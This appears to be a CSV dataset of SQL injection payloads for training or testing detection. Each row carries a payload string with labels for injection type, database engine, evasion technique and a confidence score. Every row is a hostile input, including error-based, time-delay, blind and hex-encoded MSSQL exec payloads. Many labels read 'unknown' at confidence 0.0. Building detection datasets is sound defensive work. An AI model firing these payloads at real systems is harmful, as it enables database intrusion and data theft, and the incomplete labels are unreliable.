payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1 ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 9401 = 9401",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"1\' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'sdnc\' = \'sdnc",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"1 ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and username =",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"1%\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and username =",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) or username =",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"1%\' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"select * from users where username = ""1%\' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"1%\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'%\' = \",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
"1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'xpks\' like \'xpks",unknown,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,unknown,unknown,hex_string,0.0,rule,sqliv5_csv,unknown
0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),unknown,unknown,hex_string,0.0,rule,sqliv5_csv,unknown
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),unknown,unknown,hex_string|scientific_notation,0.0,rule,sqliv5_csv,unknown
declare @s varchar ( 8000 ) select @s = 0x73656c65637420404076657273696f6e,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_csv,unknown
declare @q nvarchar ( 200 ) 0x730065006c00650063 ...,unknown,unknown,hex_string,0.0,rule,sqliv5_csv,unknown
declare @s varchar ( 200 ) select @s = 0x73656c6 ...,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_csv,unknown
declare @s varchar ( 200 ) select @s = 0x77616974 ...,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_csv,unknown
0x770061006900740066006F0072002000640065006C00 ...,unknown,unknown,hex_string,0.0,rule,sqliv5_csv,unknown
0x77616974666F722064656C61792027303A303A313027 ...,unknown,unknown,hex_string,0.0,rule,sqliv5_csv,unknown
declare @s varchar ( 8000 ) select @s = 0x73656c ...,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_csv,unknown
0x730065006c0065006300740020004000400076006500 ...,unknown,unknown,hex_string,0.0,rule,sqliv5_csv,unknown
declare @q nvarchar ( 200 ) select @q = 0x770061 ...,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_csv,unknown
declare @q nvarchar ( 200 ) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ),unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_csv,unknown
declare @s varchar ( 200 ) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_csv,unknown
declare @q nvarchar ( 200 ) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),unknown,unknown,hex_string|scientific_notation,0.0,rule,sqliv5_csv,unknown
declare @s varchar ( 200 ) select @s = 0x73656c65637420404076657273696f6e exec ( @s ),unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 6866 = 6866",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1 where 5466 = 5466 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'fbsi' like 'fbsi",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""jozh"" = ""jozh",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) ) as bedq where 8781 = 8781 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1 ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 1748 = 1748",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1"" ) ) as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'ejul' = 'ejul",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-7686%"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' where 3612 = 3612 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"-4785"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'kojx' from dual where 8140 = 8140 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1%' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( '%' = '",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'ytlf' = 'ytlf",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""cdnc"" like ""cdnc",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""tfok"" like ""tfok",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'kwhs' like 'kwhs",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1 where 1096 = 1096 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"-9011"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'wjwn' = 'wjwn",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1%"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""%"" = """,error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( '%' = '",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'ftey' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""nwzu"" like ""nwzu",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""hkjm"" like ""hkjm",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mwyu' = 'mwyu",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1'|| ( select 'oyyu' where 6765 = 6765 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) ) as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""oxvw"" = ""oxvw",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"-8209 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" where 6800 = 6800 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""egzm"" = ""egzm",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""xccy"" = ""xccy",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"-2298%' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) as xvcr where 6456 = 6456 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( '%' = '",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) # igen",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) ) as qvyu where 5962 = 5962 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1,exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 = 7759,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1'|| ( select 'jpso' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",boolean_blind,oracle,case_variation|hex_string,0.46,rule,sqliv2_csv,unknown
"1' ) as mvai where 5856 = 5856 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""ozvp"" = ""ozvp",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( '%' = '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'wqme' = 'wqme",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""dtfg"" = ""dtfg",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'rxxb' = 'rxxb",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'xtdj' = 'xtdj",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'eugs' = 'eugs",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) where 9221 = 9221 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and '%' = '",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) # fzni",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""ijag"" = ""ijag",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'xgzb' = 'xgzb",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
